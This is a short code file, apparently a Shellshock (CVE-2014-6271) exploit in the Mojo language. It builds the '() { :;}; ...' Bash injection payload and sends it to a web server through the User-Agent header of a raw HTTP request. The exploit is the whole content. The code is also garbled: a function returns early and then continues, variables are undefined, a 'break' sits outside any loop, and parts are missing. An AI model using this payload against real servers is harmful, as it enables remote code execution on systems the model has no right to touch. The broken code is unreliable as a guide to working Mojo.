# Shellshock Exploit (CVE-2014-6271) in Mojo Lang

## Description: Targets the Bash vulnerability that allows remote code execution by sending specially crafted environment variables.
## Script Outline: A script that injects malicious code into environment variables and sends them to a vulnerable web server through a CGI script.

# Function to create the malicious payload as per CVE-2014-6271
fn create_payload() -> str:
    return "() { :;}; echo 'This is my custom Bash command'"

    # Create a TCP socket
    var socket: mojo.stdlib.net.Socket = mojo.stdlib.net.Socket()
    
    # Connect to the remote host
    if socket.connect(target_server_address):
        print("Socket successfully created and connected")

        # Prepare the HTTP GET request with the malicious User-Agent header
        let data = "GET / HTTP/1.0\r\nHost: localhost\r\nUser-Agent: " + payload + "\r\nAccept: */*\r\nConnection: close\r\n\r\n"

                break
            print(String(recv_data))
    else:
        print("Failed to connect to the server")

    # Close the connection
